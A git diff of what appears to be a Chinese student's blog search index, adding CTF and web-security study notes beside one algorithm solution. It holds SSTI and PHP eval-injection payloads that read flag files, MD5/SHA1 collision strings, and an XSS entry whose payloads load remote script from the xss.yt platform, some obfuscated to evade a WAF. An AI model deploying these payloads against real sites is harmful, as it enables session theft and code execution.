@@ -14,69 +14,6 @@
       </tags>
   </entry>
   <entry>
-    <title>洛谷p1216</title>
-    <url>/2023/04/14/Algorithm/</url>
-    <content><![CDATA[<h1 id="USACO1-5-IOI1994-数字三角形-Number-Triangles"><a href="#USACO1-5-IOI1994-数字三角形-Number-Triangles" class="headerlink" title="[USACO1.5][IOI1994]数字三角形 Number Triangles"></a>[USACO1.5][IOI1994]数字三角形 Number Triangles</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>观察下面的数字金字塔。</p>
-<p>写一个程序来查找从最高点到底部任意处结束的路径，使路径经过数字的和最大。每一步可以走到左下方的点也可以到达右下方的点。</p>
-<pre><code class="cpp">        7 
-      3   8 
-    8   1   0 
-  2   7   4   4 
-4   5   2   6   5 
-</code></pre>
-<p>在上面的样例中,从 $7 \to 3 \to 8 \to 7 \to 5$ 的路径产生了最大</p>
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一个行一个正整数 $r$ ,表示行的数目。</p>
-<p>后面每行为这个数字金字塔特定行包含的整数。</p>
-<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>单独的一行,包含那个可能得到的最大的和。</p>
-<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code class="bash">5
-7
-3 8
-8 1 0
-2 7 4 4
-4 5 2 6 5
-</code></pre>
-<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code class="bash">30
-</code></pre>
-<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>【数据范围】<br>对于 $100%$ 的数据，$1\le r \le 1000$，所有输入在 $[0,100]$ 范围内。</p>
-<p>题目翻译来自NOCOW。</p>
-<p>USACO Training Section 1.5</p>
-<p>IOI1994 Day1T1</p>
-<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><blockquote>
-<p>由于从上而下不好计算，从下而上，以下一行与本行和 较大值来替代本行元素，即可从下而上完成动态规划 dp[i-1][j]+&#x3D;max(dp[i][j]+dp[i][j+1]); 从而解决问题。</p>
-</blockquote>
-<p>代码如下</p>
-<pre><code class="cpp">    #include &lt;iostream&gt;
-    using namespace std;
-    int main()&#123;
-        int arr[1000][1000];
-        int n;
-        cin&gt;&gt;n;
-        for(int i=0;i&lt;n;i++)&#123;
-            for(int j=0;j&lt;=i;j++)&#123;
-                cin&gt;&gt;arr[i][j];
-            &#125;
-        &#125;
-    
-        for(int i=n-2;i&gt;=0;i--)&#123;
-            for(int j=0;j&lt;=i;j++)&#123;
-                arr[i][j]+=max(arr[i+1][j],arr[i+1][j+1]);
-            &#125;
-        &#125;
-        cout&lt;&lt;arr[0][0];
-    
-    
-        return 0;
-&#125;
-</code></pre>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>动态规划</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CyberSafe_Notes</title>
     <url>/2023/04/19/CyberSafe-Notes/</url>
     <content><![CDATA[<h2 id="基本的dos命令"><a href="#基本的dos命令" class="headerlink" title="基本的dos命令"></a>基本的dos命令</h2><ul>
@@ -214,7 +151,8 @@ git reflog 历史
 //
 wget -r url/.git
 </code></pre>
-<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p><code>&#123;&#123;config.items()&#125;&#125;</code>- Jinja2引擎解析这个字符串时，它会返回一个包含所有配置项的列表<br><code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls ../').read()&#125;&#125;</code>读取系统文件<br><code>import os os.system(&#39;ls ../&#39;) os.system(&#39;cat ../flag&#39;)</code></p>
+<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h4 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h4><p><code>&#123;if system(&#39;cat /flag)&#125;&#123;/if&#125;</code></p>
+<p><code>&#123;&#123;config.items()&#125;&#125;</code>- Jinja2引擎解析这个字符串时，它会返回一个包含所有配置项的列表<br><code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls ../').read()&#125;&#125;</code>读取系统文件<br><code>import os os.system(&#39;ls ../&#39;) os.system(&#39;cat ../flag&#39;)</code></p>
 <pre><code class="bash">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
 &#123;% if c.__name__ == 'catch_warnings' %&#125;
   &#123;% for b in c.__init__.__globals__.values() %&#125;
@@ -611,6 +549,131 @@ MIDI (mid)，文件头(hex)：4D546864
       </tags>
   </entry>
   <entry>
+    <title>PHPsafe</title>
+    <url>/2023/05/07/PHPsafe/</url>
+    <content><![CDATA[<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre><code class="bash">&lt;?php
+    include &quot;flag.php&quot;;
+    $a = @$_REQUEST[&#39;hello&#39;];
+    eval( &quot;var_dump($a);&quot;);
+    show_source(__FILE__);
+?&gt;
+</code></pre>
+<p><code>http://114.67.175.224:14508/?hello=file(&quot;flag.php&quot;)</code><br> 我还是觉得，脱离了基础全是浮云虚幻</p>
+<p><code>?hello=system(&quot;cat%20flag.php|base64&quot;)</code><br>或许这个更适合我，只不过需要注意 ｜base64</p>
+<p>$_SERVER：包含服务器及其执行环境的信息，如头信息、路径等。<br>$_GET：包含通过 HTTP GET 方法传递给脚本的变量。<br>$_POST：包含通过 HTTP POST 方法传递给脚本的变量。<br>$_COOKIE：包含通过 HTTP Cookies 传递给脚本的变量。<br>$_FILES：包含通过 HTTP POST 方法上传的文件信息。<br>$_ENV：包含环境变量。<br>$_REQUEST：包含 $_GET、$_POST 和 $_COOKIE 的内容。请注意，由于它会合并其他超全局变量的数据，因此不建议在实际代码中使用 $_REQUEST，因为它可能导致安全隐患。<br>$_SESSION：包含当前脚本可用的会话变量。在使用 session_start() 函数启动会话后，可以使用 $_SESSION 来存储和检索跨页面请求的数据。<br>$GLOBALS：包含所有全局变量的关联数组</p>
+<p>1.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p>
+<p>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br><code>url/?kkeyey1[]=1&amp;kkeyey2[]=2</code><br>2，利用&#x3D;&#x3D;比较漏洞</p>
+<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
+<p>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p>
+<p>CbDLytmyGm2xQyaLNhWn<br>md5(CbDLytmyGm2xQyaLNhWn) &#x3D;&gt; 0ec20b7c66cafbcc7d8e8481f0653d18<br>md5(md5(CbDLytmyGm2xQyaLNhWn)) &#x3D;&gt; 0e3a5f2a80db371d4610b8f940d296af<br>770hQgrBOjrcqftrlaZk<br>md5(770hQgrBOjrcqftrlaZk) &#x3D;&gt; 0e689b4f703bdc753be7e27b45cb3625<br>md5(md5(770hQgrBOjrcqftrlaZk)) &#x3D;&gt; 0e2756da68ef740fd8f5a5c26cc45064<br>7r4lGXCH2Ksu2JNT3BYM<br>md5(7r4lGXCH2Ksu2JNT3BYM) &#x3D;&gt; 0e269ab12da27d79a6626d91f34ae849<br>md5(md5(7r4lGXCH2Ksu2JNT3BYM)) &#x3D;&gt; 0e48d320b2a97ab295f5c4694759889f</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>洛谷p1216</title>
+    <url>/2023/04/14/Algorithm/</url>
+    <content><![CDATA[<h1 id="USACO1-5-IOI1994-数字三角形-Number-Triangles"><a href="#USACO1-5-IOI1994-数字三角形-Number-Triangles" class="headerlink" title="[USACO1.5][IOI1994]数字三角形 Number Triangles"></a>[USACO1.5][IOI1994]数字三角形 Number Triangles</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>观察下面的数字金字塔。</p>
+<p>写一个程序来查找从最高点到底部任意处结束的路径，使路径经过数字的和最大。每一步可以走到左下方的点也可以到达右下方的点。</p>
+<pre><code class="cpp">        7 
+      3   8 
+    8   1   0 
+  2   7   4   4 
+4   5   2   6   5 
+</code></pre>
+<p>在上面的样例中,从 $7 \to 3 \to 8 \to 7 \to 5$ 的路径产生了最大</p>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一个行一个正整数 $r$ ,表示行的数目。</p>
+<p>后面每行为这个数字金字塔特定行包含的整数。</p>
+<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>单独的一行,包含那个可能得到的最大的和。</p>
+<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code class="bash">5
+7
+3 8
+8 1 0
+2 7 4 4
+4 5 2 6 5
+</code></pre>
+<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code class="bash">30
+</code></pre>
+<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>【数据范围】<br>对于 $100%$ 的数据，$1\le r \le 1000$，所有输入在 $[0,100]$ 范围内。</p>
+<p>题目翻译来自NOCOW。</p>
+<p>USACO Training Section 1.5</p>
+<p>IOI1994 Day1T1</p>
+<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><blockquote>
+<p>由于从上而下不好计算，从下而上，以下一行与本行和 较大值来替代本行元素，即可从下而上完成动态规划 <code>dp[i-1][j]+=max(dp[i][j]+dp[i][j+1]);</code> 从而解决问题。</p>
+</blockquote>
+<p>代码如下</p>
+<pre><code class="cpp">    #include &lt;iostream&gt;
+    using namespace std;
+    int main()&#123;
+        int arr[1000][1000];
+        int n;
+        cin&gt;&gt;n;
+        for(int i=0;i&lt;n;i++)&#123;
+            for(int j=0;j&lt;=i;j++)&#123;
+                cin&gt;&gt;arr[i][j];
+            &#125;
+        &#125;
+    
+        for(int i=n-2;i&gt;=0;i--)&#123;
+            for(int j=0;j&lt;=i;j++)&#123;
+                arr[i][j]+=max(arr[i+1][j],arr[i+1][j+1]);
+            &#125;
+        &#125;
+        cout&lt;&lt;arr[0][0];
+    
+    
+        return 0;
+&#125;
+</code></pre>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>动态规划</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS</title>
+    <url>/2023/04/16/XSS/</url>
+    <content><![CDATA[<p><a href="https://xss.yt/index/user.html">XSS平台</a></p>
+<pre><code class="bash">将如下代码植入怀疑出现xss的地方（注意&#39;的转义），即可在 项目内容 观看XSS效果。
+
+当前项目URL地址为：https://xss.yt/YLgl        【注意新增https，插入对方网站代码前缀http或者https都可】
+
+&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xss.yt/YLgl&gt;&lt;/sCrIpT&gt;
+或者
+
+&#39;&quot;&gt;&lt;input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus&gt;
+&#39;&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;
+&#39;&quot;&gt;&lt;video&gt;&lt;source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&gt;
+&#39;&quot;&gt;&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;https://xss.yt/YLgl&quot;);a.send();&lt;/script&gt;
+&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;//xss.yt/YLgl&#39;;&gt;
+下方XSS代码过一般WAF [注意如果直接把代码放入Burp，111则需要把下方代码进行URL编码]
+
+&lt;embed src=https://xss.yt/liuyan/xs.swf?a=e&amp;c=docu0075ment.write(Stu0072ing.fromu0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash&gt;&lt;/embed&gt;
+若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选&quot;基础默认XSS&quot;模块)
+
+&lt;img src=&quot;&quot; onerror=&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62))&quot;&gt;
+↓↓↓！~极限代码~！(可以不加最后的&gt;回收符号，下面代码已测试成功)↓↓↓
+
+&lt;sCRiPt/SrC=//xss.yt/YLgl&gt;
+</code></pre>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NEEPU</title>
     <url>/2023/05/22/NEEPU/</url>
     <content><![CDATA[<h3 id="EZPHP"><a href="#EZPHP" class="headerlink" title="EZPHP"></a>EZPHP</h3><blockquote>
@@ -693,64 +756,410 @@ if (isset($a))&#123;
       </tags>
   </entry>
   <entry>
-    <title>XSS</title>
-    <url>/2023/04/16/XSS/</url>
-    <content><![CDATA[<p><a href="https://xss.yt/index/user.html">XSS平台</a></p>
-<pre><code class="bash">将如下代码植入怀疑出现xss的地方（注意&#39;的转义），即可在 项目内容 观看XSS效果。
-
-当前项目URL地址为：https://xss.yt/YLgl        【注意新增https，插入对方网站代码前缀http或者https都可】
-
-&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xss.yt/YLgl&gt;&lt;/sCrIpT&gt;
-或者
-
-&#39;&quot;&gt;&lt;input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus&gt;
-&#39;&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;
-&#39;&quot;&gt;&lt;video&gt;&lt;source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&gt;
-&#39;&quot;&gt;&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;https://xss.yt/YLgl&quot;);a.send();&lt;/script&gt;
-&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;//xss.yt/YLgl&#39;;&gt;
-下方XSS代码过一般WAF [注意如果直接把代码放入Burp，111则需要把下方代码进行URL编码]
-
-&lt;embed src=https://xss.yt/liuyan/xs.swf?a=e&amp;c=docu0075ment.write(Stu0072ing.fromu0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash&gt;&lt;/embed&gt;
-若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选&quot;基础默认XSS&quot;模块)
-
-&lt;img src=&quot;&quot; onerror=&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62))&quot;&gt;
-↓↓↓！~极限代码~！(可以不加最后的&gt;回收符号，下面代码已测试成功)↓↓↓
-
-&lt;sCRiPt/SrC=//xss.yt/YLgl&gt;
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHPsafe</title>
-    <url>/2023/05/07/PHPsafe/</url>
-    <content><![CDATA[<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre><code class="bash">&lt;?php
-    include &quot;flag.php&quot;;
-    $a = @$_REQUEST[&#39;hello&#39;];
-    eval( &quot;var_dump($a);&quot;);
-    show_source(__FILE__);
+    <title>interesting</title>
+    <url>/2023/05/30/interesting/</url>
+    <content><![CDATA[<h2 id="Something-interesting"><a href="#Something-interesting" class="headerlink" title="Something interesting"></a>Something interesting</h2><h3 id="神奇的Unicode编码"><a href="#神奇的Unicode编码" class="headerlink" title="神奇的Unicode编码"></a>神奇的Unicode编码</h3><p><img src="/../post_img/fununicode.png" alt="都是假的"></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+include &quot;flag.php&quot;;
+// ‮⁦NISACTF⁩⁦Welcome to
+if (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦ Flag!⁩⁦N1SACTF&quot; == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; //tnnd! weishenme b
+    echo $FLAG;
+&#125;
+show_source(__FILE__);
 ?&gt;
 </code></pre>
-<p><code>http://114.67.175.224:14508/?hello=file(&quot;flag.php&quot;)</code><br> 我还是觉得，脱离了基础全是浮云虚幻</p>
-<p><code>?hello=system(&quot;cat%20flag.php|base64&quot;)</code><br>或许这个更适合我，只不过需要注意 ｜base64</p>
-<p>$_SERVER：包含服务器及其执行环境的信息，如头信息、路径等。<br>$_GET：包含通过 HTTP GET 方法传递给脚本的变量。<br>$_POST：包含通过 HTTP POST 方法传递给脚本的变量。<br>$_COOKIE：包含通过 HTTP Cookies 传递给脚本的变量。<br>$_FILES：包含通过 HTTP POST 方法上传的文件信息。<br>$_ENV：包含环境变量。<br>$_REQUEST：包含 $_GET、$_POST 和 $_COOKIE 的内容。请注意，由于它会合并其他超全局变量的数据，因此不建议在实际代码中使用 $_REQUEST，因为它可能导致安全隐患。<br>$_SESSION：包含当前脚本可用的会话变量。在使用 session_start() 函数启动会话后，可以使用 $_SESSION 来存储和检索跨页面请求的数据。<br>$GLOBALS：包含所有全局变量的关联数组</p>
-<p>1.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p>
-<p>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br><code>url/?kkeyey1[]=1&amp;kkeyey2[]=2</code><br>2，利用&#x3D;&#x3D;比较漏洞</p>
-<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
-<p>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p>
+<p>我们cv下来，貌似没有变化，cv到文件，用010打开看看二进制。</p>
+<p><img src="/../post_img/fununicode1.png" alt="这是真的"></p>
+<p>真奇妙对吧。 什么原理呢</p>
+<p>其实粘贴后可以看到，代码中出现了<code>U+202E</code>,<code>U+2066</code>,<code>U+2069</code>,那这些东西是什么呢。</p>
+<p>直接解释：<code>U+202E</code>是从右往左强制符；<code>U+2066</code>是这之间的字符从左到右显示，不影响外围字符；<code>U+2069</code>是作为RLI、LRI、FSi翻转结束的标识。</p>
+<p>参考文章：<a href="https://www.xiinnn.com/article/22d50835.html">here</a><br>题目：[NISACTF 2022]checkin</p>
+<h3 id="md5硬碰撞和sha1硬碰撞"><a href="#md5硬碰撞和sha1硬碰撞" class="headerlink" title="md5硬碰撞和sha1硬碰撞"></a>md5硬碰撞和sha1硬碰撞</h3><p>md5:</p>
+<pre><code class="bash"> payload:array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+</code></pre>
+<pre><code class="bash">array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+</code></pre>
+<p>sha1:</p>
+<pre><code class="bash"> array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
+</code></pre>
+<pre><code class="bash"> array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
+</code></pre>
+<h3 id="下划线绕过"><a href="#下划线绕过" class="headerlink" title="下划线绕过"></a>下划线绕过</h3><p>php的变量解析绕过, php会把请求参数中的非法字符转为下划线<br><code>+</code></p>
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><p>create_function 是 PHP 的一个内置函数，但是在 PHP 7.2.0 以后，这个函数已经被废弃，官方文档中推荐使用匿名函数作为替代。</p>
+<pre><code class="php">eg:
+&lt;?php
+$newfunc = create_function(&#39;$x&#39;, &#39;return $x * $x;&#39;);
+echo &quot;Square of 3 is &quot; . $newfunc(3);
+?&gt;
+</code></pre>
+<p>在这个例子中，create_function 创建了一个新函数，这个函数接收一个参数 x 并且返回 x 的平方。然后我们用这个新函数来计算 3 的平方。</p>
+<p><strong>create_function 函数在 PHP 内部实际上是使用了 eval() 函数来创建新的函数。</strong></p>
+<pre><code class="bash">&lt;?php
+//sorry , here is true last level
+//^_^
+error_reporting(0);
+include &quot;str.php&quot;;
+
+$a = $_GET[&#39;a&#39;];
+$b = $_GET[&#39;b&#39;];
+if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$a))&#123;
+    show_source(__FILE__);
+&#125;
+else&#123;
+    $a(&#39;&#39;,$b);
+&#125;
+
+?a=\create_function&amp;b=&#125;system(&#39;tac /flag&#39;);//
+</code></pre>
